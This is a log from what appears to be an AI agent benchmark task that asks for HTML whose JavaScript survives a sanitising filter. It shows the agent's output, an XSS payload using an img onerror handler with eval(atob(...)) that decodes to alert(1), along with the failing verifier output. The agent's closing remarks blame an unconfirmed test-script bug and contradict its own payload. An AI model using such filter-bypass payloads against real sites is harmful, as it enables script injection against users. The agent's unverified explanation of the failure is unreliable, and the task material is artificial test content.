@@ -1,0 +1,55 @@
+=== break-filter-js-from-html -> /app/out.html ===
+WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
+CID=576893be3072057831512852f9da272b22233093656417ebada8da949dbf2b96 (NOT auto-cleaned, run 'docker rm -f 576893be3072057831512852f9da272b22233093656417ebada8da949dbf2b96' when done)
+
+=== Running hermes chat ===
+```
+
+Or using base64 encoded JavaScript with URL encoding that survives the filter.
+
+The test script has a bug (looks for `/tests/filter.py` instead of `/app/filter.py`), so I couldn't fully verify the bypass. However, the key insight is that the filter is incomplete - it doesn't remove javascript: or data: URLs, only script tags and on* attributes.
+
+session_id: 20260505_020615_4d023b
+Exported 1 sessions to /workspace/turns.jsonl
+
+=== Output /app/out.html ===
+-rw-r--r-- 1 agent agent 95 May  5 02:07 /app/out.html
+---
+<!DOCTYPE html>
+<html>
+<body>
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+</body>
+</html>
+
+=== Tool calls used ===
+tool_calls: 15 messages: 33 in/out: 111175 / 2115
+
+=== Verifier ===
+                alert_detected = True
+    
+            except TimeoutException:
+                # No alert appeared within timeout
+                alert_detected = False
+    
+        finally:
+            if driver:
+                driver.quit()
+            # Clean up temp file
+            filtered_path.unlink(missing_ok=True)
+    
+        # Assert that an alert was detected even after filtering
+>       assert alert_detected, (
+            "No alert detected after filtering. The XSS bypass failed. "
+            "The filter successfully removed the JavaScript. "
+            "The HTML needs to be crafted to bypass the filter."
+        )
+E       AssertionError: No alert detected after filtering. The XSS bypass failed. The filter successfully removed the JavaScript. The HTML needs to be crafted to bypass the filter.
+E       assert False
+
+/tests/test_outputs.py:91: AssertionError
+=========================== short test summary info ============================
+FAILED ../tests/test_outputs.py::test_out_html_bypasses_filter - AssertionErr...
+============================== 1 failed in 9.93s ===============================
+
+--- ctrf summary ---
